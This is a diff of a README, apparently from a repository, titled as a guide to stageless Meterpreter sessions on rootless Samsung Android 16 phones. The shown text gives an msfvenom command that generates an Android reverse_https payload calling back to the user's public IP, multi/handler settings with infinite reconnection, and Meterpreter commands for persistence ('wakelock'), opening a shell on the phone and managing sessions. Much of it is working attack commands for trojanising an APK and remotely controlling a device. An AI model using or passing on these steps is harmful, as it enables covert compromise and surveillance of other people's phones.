@@ -1,4 +1,4 @@
-# Stageless Meterpreter Sessions on Android 16 - Samsung Z Flip 5 Rootless (2026):
+# Stageless Meterpreter Sessions on Android 16 - Samsung Phones (Rootless, 2026):
 [![github-banner.jpg](https://i.postimg.cc/sxhdzJLF/github-banner.jpg)](https://postimg.cc/n9pwYqZT)
 # Android Penetration Testing Workflow: APK Modification & Local Deployment Guide:
 
@@ -10,18 +10,18 @@ This repository **documents** the **technical process** of **injecting a Metaspl
 ## Prerequisites
 
 **Ensure** you have the **following tools installed** and **available** in your **system path** and **port forwarding** set up on your **wifi router**:
-* **Wifi Router Port Forwarding Active** (`to your Computers Local IP [192.168...]`)
-* **Metasploit Framework** (`msfvenom`, `msfconsole`)
+* **Wifi Router Port Forwarding Active** *(`to your Computers Local IP [192.168...]`)*
+* **Metasploit Framework** *(`msfvenom`, `msfconsole`)*
 * **Apktool**
 * **Zipalign**
-* **Java Development Kit** (`keytool`, `apksigner`)
-* **Android Debug Bridge** (`adb`)
+* **Java Development Kit** *(`keytool`, `apksigner`)*
+* **Android Debug Bridge** *(`adb`)*
 
 ---
 
 ## Step 1: Payload Generation
 
-**Generate the payload** by **targeting** a **local machine interface**. This **bypasses** network domain resolution **entirely** during **local debugging**. `Be sure to use / for stageless ( meterpreter/reverse_https ) for msfvenom and your msfconsole payload setup.`
+**Generate the payload** by **targeting** a **local machine interface**. This **bypasses** network domain resolution **entirely** during **local debugging**. *`Be sure to use / for stageless ( meterpreter/reverse_https ) for msfvenom and your msfconsole payload setup.`*
 
 ```bash
 msfvenom -p android/meterpreter/reverse_https LHOST=[YOUR PUBLIC IP] LPORT=443 -o payload_example.apk
@@ -156,26 +156,61 @@ set PAYLOAD android/meterpreter/reverse_https
 set LHOST [YOUR PUBLIC IP]
 set LPORT 443
 set ExitOnSession false
-set SessionRetryTotal (0 for infinite reconnection attempts & 3600 for 1 hour)
+set SessionRetryTotal 0
 run
 
 ```
-### Expected Output *(App on phone MUST grant permissions and be CLICKED at least once)*
-```text
-[*] Meterpreter session 1 opened successfully established.
+**Expected Output** *(App on phone MUST grant permissions and be CLICKED at least once)*
 
-meterpreter >
-```
+`[*] Started reverse handler `
 
-### Once session starts
-```
-meterpreter > help (to see available commands)
-meterpreter > wakelock 
-background (to go back to msfconsole without killing session)
-msf exploit(multi/handler) > sessions -l (to list sessions)
-msf exploit(multi/handler) > sessions -i 1 (or other #) to open session
-```
+`[*] Starting the payload handler...`
 
+`[*] Sending stage (1.2 MB) to [ YOUR LOCAL IP ]`
+
+`[*] Meterpreter session 1 opened (10.0.0.5:4444 -> [ YOUR LOCAL IP:49152)`
+
+**meterpreter >**
+
+
+**Once session starts:**
+```bash
+# To see available commands meterpreter >
+help
+```
+```bash
+# For persistence meterpreter > 
+wakelock 
+```
+```bash
+# To open app shell
+shell
+```
+```bash
+# To go back to msf exploit(multi/handler) > without killing session
+background
+```
+**Once background is entered:**
+```bash
+# To list sessions -  msf exploit(multi/handler) > 
+sessions -l
+```
+```bash
+# To kill certain sessions - msf exploit(multi/handler) >
+sessions -k 1,2,3
+```
+```bash
+# To kill ALL sessions - msf exploit(multi/handler) >
+sessions -K
+```
+```bash
+# To open/reopen a session - msf exploit(multi/handler) >
+ sessions -i 1
+```
+```bash
+# To extend timeout of a session (change interact # to session number & timeout to time you want) - msf exploit(multi/handler) >
+sessions --interact 1 --timeout 120
+```
 ### BOOOOOOM!!!
 You got **stageless meterpreter** sessions open! 
 
